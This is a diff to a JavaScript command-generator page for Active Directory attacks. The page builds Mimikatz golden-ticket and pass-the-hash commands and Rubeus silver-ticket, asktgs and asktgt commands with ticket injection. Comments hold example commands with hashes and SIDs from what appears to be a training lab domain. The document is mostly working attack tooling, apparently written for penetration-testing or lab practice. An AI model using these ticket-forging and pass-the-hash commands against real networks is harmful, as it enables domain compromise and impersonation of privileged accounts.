@@ -67,24 +67,24 @@ function generateCrossForestCommand(form_id) {
 	let serviceSPN = document.querySelector("#form-cross-tgs #service")?.value ?? "";
 	let dc = document.querySelector("#form-cross-tgs #dc")?.value ?? "";
 	let ticket = document.querySelector("#form-cross-tgs #ticket")?.value ?? "";
-
+	
 	// flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /target:${targetDomain} /service:${service} /rc4:${rc4} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
-
+	
 	// if (tool == "invoke-mimikatz") {
 	// 	command = `${tool} -Command '${flags}'`;
 	// } else if (tool == "rubeus.exe") {
 	// 	// Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /aes256:4b3d9c78a58e13dba8366da47a490c00dfacbfe0d5b82a710fb463ca3238a093 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap
-
+	
 	// }
-
+	
 	commandTGT = `${toolsPath}rubeus.exe silver /user:${user} /domain:${currentDomain} /service:KRBTGT/${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /ldap /ptt /nowrap`;
-
+	
 	commandTGS = `${toolsPath}rubeus.exe asktgs /user:${user} /service:${serviceSPN} /dc:${dc} /ptt /ticket:${ticket}`;
-
+	
 	if (form_id == "form-cross-tgt")
-		document.querySelector("#command-cross-tgt").value = commandTGT;
+	document.querySelector("#command-cross-tgt").value = commandTGT;
 	else if (form_id == "form-cross-tgs")
-		document.querySelector("#command-cross-tgs").value = commandTGS;
+	document.querySelector("#command-cross-tgs").value = commandTGS;
 }
 
 // Function to generate command for Inter Forest tab
@@ -177,13 +177,13 @@ function generateKerberosTicketsCommand(form_id) {
 	} else if (form_id == "form-golden") {
 		let user = document.querySelector("#form-golden #user").value;
 		let currentDomain = (window.currentDomain || document.querySelector("#form-golden #current-domain")?.value) ?? "";
-		let currentDomainSID = (window.currentDomain || document.querySelector("#form-global #current-sid")?.value) ?? "";
-		let rc4 = document.querySelector("#form-golden #rc4")?.value ?? "";
+		let currentDomainSID = (window.currentDomainSID || document.querySelector("#form-golden #current-domain-sid")?.value) ?? "";
+		let rc4 = (window.krbtgt || document.querySelector("#form-golden #rc4")?.value) ?? "";
 		let aes256 = document.querySelector("#form-golden #aes256")?.value ?? "";
 		let startoffset = document.querySelector("#form-golden #startoffset").value;
 		let endin = document.querySelector("#form-golden #endin").value;
 		let renewmax = document.querySelector("#form-golden #renewmax").value;
-
+		
 		//  C:\ad\Tools\betterSafetyKatz.exe "kerberos::golden /user:Administrator /rc4:2368c4a2a27b01d0118cb809352f17be /domain:dollarcorp.moneycorp.local / /sid:S-1-5-21-719815819-3726368948-391768864 /ptt" "exit"
 		flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /${aes256 ? 'aes256' : 'rc4'}:${aes256 || rc4} /sid:${currentDomainSID} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;
 		
@@ -200,12 +200,12 @@ function generateKerberosTicketsCommand(form_id) {
 		document.querySelector("#command-golden").value = command;
 	} else if (form_id == "form-pth") {
 		let user = document.querySelector("#form-pth #user").value;
-		let currentDomain = (window.currentDomain || document.querySelector("#form-global #current-domain")?.value )?? "";
+		let currentDomain = (window.currentDomain || document.querySelector("#form-pth #current-domain")?.value )?? "";
 		let aes256 = document.querySelector("#form-pth #aes256").value;
+		let rc4 = document.querySelector("#form-pth #rc4").value;
 		let startoffset = document.querySelector("#form-pth #startoffset").value;
 		let endin = document.querySelector("#form-pth #endin").value;
 		let renewmax = document.querySelector("#form-pth #renewmax").value;
-		let rc4 = document.querySelector("#form-pth #rc4").value;
 		
 		// C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:cmd.exe" "exit"
 		
@@ -216,7 +216,7 @@ function generateKerberosTicketsCommand(form_id) {
 		} else if (tool == "rubeus.exe") {
 			// Rubeus.exe asktgt /user:srvadmin /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 			
-			command = `${toolsPath}${tool} asktgt /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256:' + aes256 + ' /opsec' : 'rc4:' + rc4} /ldap /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt`;
+			command = `${toolsPath}${tool} asktgt /user:${user} /domain:${currentDomain} /${aes256 ? 'aes256:' + aes256 + ' /opsec' : 'rc4:' + rc4} /ldap /createnetonly:C:\\Windows\\System32\\cmd.exe /printcmd /show /ptt`;
 		} else {
 			command = `${toolsPath}${tool} ${flags}`;
 		}
@@ -333,6 +333,14 @@ function getCookie(name) {
 function updateCookieAndInput(event) {
 	var input = event.target;
 	setCookie(input.id, input.value, 30);
+
+	// update global variables
+	toolsPath = getCookie('tools-path') || '';
+	parentDomain = getCookie('parent-domain') || '';
+	currentDomain = getCookie('current-domain') || '';
+	currentDomainSID = getCookie('current-sid') || '';
+	parentDomainSID = getCookie('parent-sid') || '';
+	krbtgt = getCookie('krbtgt') || '';
 }
 
 // Function to fill form inputs with cookie values
